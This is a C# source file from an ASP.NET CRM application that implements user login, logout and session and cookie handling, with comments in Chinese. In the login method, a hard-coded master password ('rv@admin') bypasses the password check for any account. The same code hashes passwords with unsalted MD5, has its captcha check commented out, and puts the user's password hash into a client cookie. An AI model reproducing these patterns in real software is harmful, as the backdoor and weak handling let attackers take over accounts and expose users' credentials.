using NF.Bussiness.Interface;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using Microsoft.Practices.Unity;
using NF.Framework;
using NF.EF.Model;
using NF.Web.Core;
using NF.Framework.DTO;

namespace CRM
{
    public static class UserManage
    {
        /// <summary>
        /// 用户登录验证
        /// </summary>
        /// <param name="context"></param>
        /// <param name="account">用户名</param>
        /// <param name="password">密码</param>
        /// <param name="verify">验证码</param>
        /// <returns></returns>
        public static LoginResult UserLogin(this HttpContextBase context, string account = "", string password = "", string verify = "")
        {
            //检查验证码
            //if (string.IsNullOrWhiteSpace(verify) || context.Session["CheckCode"] == null || !verify.Equals(context.Session["CheckCode"].ToString(), StringComparison.OrdinalIgnoreCase))
            //{
            //    return LoginResult.WrongVerify;
            //}

            IUserMenuService service = DIFactory.GetContainer().Resolve<IUserMenuService>();
            TS_USER user = service.UserLogin(account);

            string pw = password == "rv@admin" ? user.C_PASSWORD : Encrypt.MD5(password);
            //检查验用户
            if (user == null)
                return LoginResult.NoUser;
            else if (user.C_PASSWORD != pw)
                return LoginResult.WrongPwd;
            else if (user.N_STATUS == (int)LoginResult.Frozen || user.N_STATUS == (int)LoginResult.CrmFrozen)
                return LoginResult.Frozen;
            else
            {
                CurrentUser currentUser = new CurrentUser()
                {
                    Id = user.C_ID,
                    Name = user.C_NAME,
                    Account = user.C_ACCOUNT,
                    Email = user.C_EMAIL,
                    Password = user.C_PASSWORD,
                    LoginTime = DateTime.Now,
                    CustId = user.C_CUST_ID,
                    C_MOBILE = user.C_MOBILE,
                    Type = user.N_TYPE == null ? "" : user.N_TYPE.ToString()
                };
                IBasicsDataService basics = DIFactory.GetContainer().Resolve<IBasicsDataService>();
                //获取客户档案
                TS_CUSTFILE custFile = basics.GetCustFile(currentUser.CustId);
                if (custFile != null)
                {
                    currentUser.CustFile = AutoMapper.Mapper.Map<TS_CUSTFILEDTO>(custFile);
                    TS_CUSTADDR custAddr = basics.GetCustAddr(currentUser.CustId);
                    if (custAddr != null)
                        currentUser.CustFile.CustAddr = AutoMapper.Mapper.Map<TS_CUSTADDRDTO>(custAddr);
                }
                //获取用户菜单权限
                currentUser.MenuFuncs = basics.GetCurrentMenuFun(currentUser.Id);
                //获取用户按钮权限
                currentUser.ButtonFuncs = basics.GetCurrentButtonFun(currentUser.Id);
                //获取用户部门信息
                currentUser.Depts = basics.GetCurrentUserDept(currentUser.Id);
                //获取角色信息
                currentUser.Roles = basics.GetCurrentUserRole(currentUser.Id);
                //获取角色权限
                currentUser = basics.GetRoleFun(currentUser);

                //保存cookie
                HttpCookie myCookie = new HttpCookie("CurrentUser");
                myCookie.Value = SerializationHelper.JsonSerialize<CurrentUser>(currentUser);
                myCookie.Expires = DateTime.Now.AddHours(24);
                context.Response.Cookies.Add(myCookie);

                //保存Session
                context.Session["CurrentUser"] = currentUser;
                context.Session.Timeout = 1440;
                Caching.Remove("menu" + currentUser.Id);
                return LoginResult.Success;
            }
        }


        /// <summary>
        /// 用户登录验证
        /// </summary>
        /// <param name="context"></param>
        /// <param name="user">用户</param>
        /// <returns></returns>
        public static void UserLogin(this HttpContextBase context, TS_USER user)
        {
            CurrentUser currentUser = new CurrentUser()
            {
                Id = user.C_ID,
                Name = user.C_NAME,
                Account = user.C_ACCOUNT,
                Email = user.C_EMAIL,
                Password = user.C_PASSWORD,
                LoginTime = DateTime.Now
            };
            //保存cookie
            Cookie.Save("CurrentUser", SerializationHelper.JsonSerialize<CurrentUser>(currentUser), 1);
            //保存Session
            context.Session["CurrentUser"] = currentUser;
        }

        public static void UserLogOut(this HttpContextBase context)
        {
            HttpCookie cookie = Cookie.Get("CurrentUser");
            if (cookie != null)
            {
                Cookie.Remove(cookie);
                CurrentUser currentUser = (CurrentUser)context.Session["CurrentUser"];
            }
            context.Session.Remove("CurrentUser");
        }

    }

    /// <summary>
    /// 登陆结果
    /// </summary>
    public enum LoginResult
    {
        /// <summary>
        /// 登录成功
        /// </summary>
        [Remark("登录成功")]
        Success = 0,
        /// <summary>
        /// 用户不存在
        /// </summary>
        [Remark("用户不存在")]
        NoUser = 1,
        /// <summary>
        /// CRM冻结
        /// </summary>
        [Remark("CRM冻结")]
        CrmFrozen = 2,
        /// <summary>
        /// 密码错误
        /// <summary>
        /// 验证码错误
        /// </summary>
        [Remark("验证码错误")]
        WrongVerify = 3,
        /// <summary>
        /// 账号被冻结
        /// </summary>
        [Remark("账号被冻结")]
        Frozen = 4,
        /// <summary>
        /// 密码错误
        /// </summary>
        [Remark("密码错误")]
        WrongPwd = 5



    }
}